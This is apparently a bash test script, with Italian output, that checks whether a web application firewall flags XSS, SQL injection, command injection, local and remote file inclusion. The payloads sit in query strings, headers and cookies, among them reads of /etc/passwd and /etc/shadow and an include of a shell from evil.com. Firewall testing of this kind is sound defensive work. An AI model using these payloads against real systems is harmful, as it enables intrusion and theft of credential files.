
#!/bin/bash

URL="http://172.16.216.10"

echo "=============================================="
echo "TEST FINALE WAF - TUTTI I VETTORI"
echo "=============================================="

test_attack() {
    local name="$1"
    local expected="$2"
    local cmd="$3"
    
    result=$(eval $cmd 2>/dev/null | jq -r '.threat_type // "PASS"')
    
    if [ "$result" == "$expected" ]; then
        echo "$name: $result"
    else
        echo "$name: GOT $result, EXPECTED $expected"
    fi
}

echo -e "\n=== XSS Tests ==="
test_attack "Query XSS" "XSS" "curl -s -G --data-urlencode 'q=<script>alert(1)</script>' $URL"
test_attack "User-Agent XSS" "XSS" "curl -s -H 'User-Agent: <script>alert(1)</script>' $URL"
test_attack "Referer XSS" "XSS" "curl -s -H 'Referer: <img src=x onerror=alert(1)>' $URL"
test_attack "Cookie XSS" "XSS" "curl -s -H 'Cookie: test=<svg onload=alert(1)>' $URL"

echo -e "\n=== SQL Injection Tests ==="
test_attack "Query SQLi" "SQL_INJECTION" "curl -s -G --data-urlencode \"id=1' OR '1'='1\" $URL"
test_attack "User-Agent SQLi" "SQL_INJECTION" "curl -s -H \"User-Agent: ' OR '1'='1\" $URL"
test_attack "Cookie SQLi" "SQL_INJECTION" "curl -s -H 'Cookie: id=1 UNION SELECT NULL--' $URL"

echo -e "\n=== Command Injection Tests ==="
test_attack "Query CmdInj" "COMMAND_INJECTION" "curl -s -G --data-urlencode 'cmd=; ls -la' $URL"
test_attack "User-Agent CmdInj" "COMMAND_INJECTION" "curl -s -H 'User-Agent: test; whoami' $URL"
test_attack "Param CmdInj" "COMMAND_INJECTION" "curl -s -G --data-urlencode 'exec=\$(cat /etc/passwd)' $URL"

echo -e "\n=== LFI Tests ==="
test_attack "Query LFI" "LFI" "curl -s -G --data-urlencode 'file=../../etc/passwd' $URL"
test_attack "User-Agent LFI" "LFI" "curl -s -H 'User-Agent: ../../../../etc/shadow' $URL"

echo -e "\n=== RFI Tests ==="
test_attack "Query RFI" "RFI" "curl -s -G --data-urlencode 'page=http://evil.com/shell.php' $URL"

echo -e "\n=============================================="
echo "TUTTI I TEST COMPLETATI!"
echo "=========================================